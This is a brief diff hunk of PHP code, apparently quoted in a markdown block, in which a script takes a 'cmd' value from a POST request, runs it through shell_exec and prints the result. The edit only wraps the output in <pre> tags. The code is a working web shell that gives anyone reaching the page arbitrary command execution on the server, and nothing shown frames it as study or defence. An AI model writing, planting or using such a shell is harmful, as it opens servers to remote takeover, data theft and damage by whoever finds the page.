@@ -64,7 +64,7 @@ if (isset($_POST['cmd'])) {
 if (isset($_POST['cmd'])) {
     $command = $_POST['cmd'];
     $output = shell_exec($command);
-    echo $output;
+    echo "<pre>$output</pre>";
 }
 ?>
 ```
